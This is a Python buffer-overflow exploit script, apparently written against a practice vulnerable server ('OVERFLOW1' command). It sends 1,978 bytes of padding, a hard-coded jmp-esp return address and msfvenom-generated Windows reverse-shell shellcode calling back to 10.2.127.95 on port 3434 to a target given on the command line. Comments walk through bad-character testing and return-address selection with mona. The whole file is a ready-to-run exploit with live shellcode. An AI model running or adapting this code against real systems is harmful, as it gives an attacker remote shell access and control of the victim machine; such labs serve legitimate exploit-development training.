#!/usr/bin/env python3
# bc_check_exploit.py --
# @dualfade

# gen bad chars --
# pip install badchars
# badchars -f python | sed 's/^\s*\"./\tb"\\/g' \
# xclipc -selection clipboard

# skel refs --
# https://bit.ly/3KIIjzz --

import socket
import sys
from optparse import OptionParser

# from struct import pack

def payload_send():
    """ send payload function -- """

    # args --
    length = str(options.length)

    try:
        print('[info] sending payload')

        # initial \x41 test payload --
        buf = b'OVERFLOW1\x20'     # <- SPACE required --
        # buf += b"\x41" * int(length)

        padding1 = b'\x41' * int(1978)
        # eip = b'\x42' * int(4)

        # reverse jmp esp value --
        # ins \x --
        eip = b'\xAF\x11\x50\x62'
        padding2 = b'\x43' * int(100)

        # esp @ crash -> 0x018EFA30
        # !mona bytearray -b "\x00"
        # !mona compare -f bytearray.bin -a 0x018EFA30

        # mona Memory comparison results, item 0
        # Address=0x018efa30
        # Status=Corruption after 6 bytes
        # BadChars=00 07 08 2e 2f a0 a1
        # Type=normal
        # Location=Stack

        # !mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"

        # jmp esp -> 1st two --
        # note: look for dll's without protections --
        # 625011AF
        # 625011BB
        # resend and check with updates bc's --

        # badchars = (
        #     b"\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        #     b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        #     b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30"
        #     b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        #     b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        #     b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        #     b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        #     b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        #     b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        #     b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        #     b"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        #     b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        #     b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        #     b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        #     b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        #     b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        # )

        # looks good ! 
        # check stack space --
        # 504 bytes ???

        # payload --
        # manually add nops -- 
        # msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.95 LPORT=3434 \
        # -b '\x00\x07\x08\x2e\x2f\xa0\xa1' EXITFUNC=thread -v sc -f python | xlclipc
        # 348 bytes + 16 nops --
        sc =  b"\x90" * int(16)
        sc += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
        sc += b"\x76\x0e\x64\x59\xb5\xb3\x83\xee\xfc\xe2\xf4\x98\xb1"
        sc += b"\x37\xb3\x64\x59\xd5\x3a\x81\x68\x75\xd7\xef\x09\x85"
        sc += b"\x38\x36\x55\x3e\xe1\x70\xd2\xc7\x9b\x6b\xee\xff\x95"
        sc += b"\x55\xa6\x19\x8f\x05\x25\xb7\x9f\x44\x98\x7a\xbe\x65"
        sc += b"\x9e\x57\x41\x36\x0e\x3e\xe1\x74\xd2\xff\x8f\xef\x15"
        sc += b"\xa4\xcb\x87\x11\xb4\x62\x35\xd2\xec\x93\x65\x8a\x3e"
        sc += b"\xfa\x7c\xba\x8f\xfa\xef\x6d\x3e\xb2\xb2\x68\x4a\x1f"
        sc += b"\xa5\x96\xb8\xb2\xa3\x61\x55\xc6\x92\x5a\xc8\x4b\x5f"
        sc += b"\x24\x91\xc6\x80\x01\x3e\xeb\x40\x58\x66\xd5\xef\x55"
        sc += b"\xfe\x38\x3c\x45\xb4\x60\xef\x5d\x3e\xb2\xb4\xd0\xf1"
        sc += b"\x97\x40\x02\xee\xd2\x3d\x03\xe4\x4c\x84\x06\xea\xe9"
        sc += b"\xef\x4b\x5e\x3e\x39\x31\x86\x81\x64\x59\xdd\xc4\x17"
        sc += b"\x6b\xea\xe7\x0c\x15\xc2\x95\x63\xa6\x60\x0b\xf4\x58"
        sc += b"\xb5\xb3\x4d\x9d\xe1\xe3\x0c\x70\x35\xd8\x64\xa6\x60"
        sc += b"\xe3\x34\x09\xe5\xf3\x34\x19\xe5\xdb\x8e\x56\x6a\x53"
        sc += b"\x9b\x8c\x22\xd9\x61\x31\xbf\xb1\x1b\x06\xdd\xb1\x64"
        sc += b"\x54\xdf\x3a\x82\x33\xa5\xe5\x33\x31\x2c\x16\x10\x38"
        sc += b"\x4a\x66\xe1\x99\xc1\xbf\x9b\x17\xbd\xc6\x88\x31\x45"
        sc += b"\x06\xc6\x0f\x4a\x66\x0c\x3a\xd8\xd7\x64\xd0\x56\xe4"
        sc += b"\x33\x0e\x84\x45\x0e\x4b\xec\xe5\x86\xa4\xd3\x74\x20"
        sc += b"\x7d\x89\xb2\x65\xd4\xf1\x97\x74\x9f\xb5\xf7\x30\x09"
        sc += b"\xe3\xe5\x32\x1f\xe3\xfd\x32\x0f\xe6\xe5\x0c\x20\x79"
        sc += b"\x8c\xe2\xa6\x60\x3a\x84\x17\xe3\xf5\x9b\x69\xdd\xbb"
        sc += b"\xe3\x44\xd5\x4c\xb1\xe2\x55\xae\x4e\x53\xdd\x15\xf1"
        sc += b"\xe4\x28\x4c\xb1\x65\xb3\xcf\x6e\xd9\x4e\x53\x11\x5c"
        sc += b"\x0e\xf4\x77\x2b\xda\xd9\x64\x0a\x4a\x66"

        payload = b''.join([buf, padding1, eip, sc, padding2])
        sock_connect(payload)

    except OSError as err:
        error(err)

def sock_connect(buffer):
    """ socket connect function --"""

    try:
        # args --
        port = int(options.port)
        target = str(options.target)

        print("[info]: sending => %s" % buffer)
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('%s' % target, port))
        s.send(buffer)

        # get resp --
        resp = s.recv(1024)
        print(resp)

        # finally close socket; ret resp --
        s.close()

    # except --
    except OSError as err:
        error(err)

def error(err):
    """ standard error message -- """

    print('[err] application error %s' % err)
    print('[err] exiting now.')
    sys.exit(-1)

# main --
if __name__ == "__main__":
    """ main function args -- """

    # parser opts --
    parser = OptionParser()
    parser.add_option('-t', '--target', dest='target', help='target ip address')
    parser.add_option('-p', '--port', dest='port', help='port')
    parser.add_option('-l', '--length', dest='length', help='payload length')
    try:
        (options, args) = parser.parse_args()
        if (options.target):

            # start --
            print('[info] starting exploit')
            payload_send()
            sys.exit(-1)
        else:
            print('[err] missing input')
            print('[err] exiting')
            sys.exit(-1)
    except SystemExit:
        sys.stdout.write("\n")
        sys.stdout.flush()



#__eof__
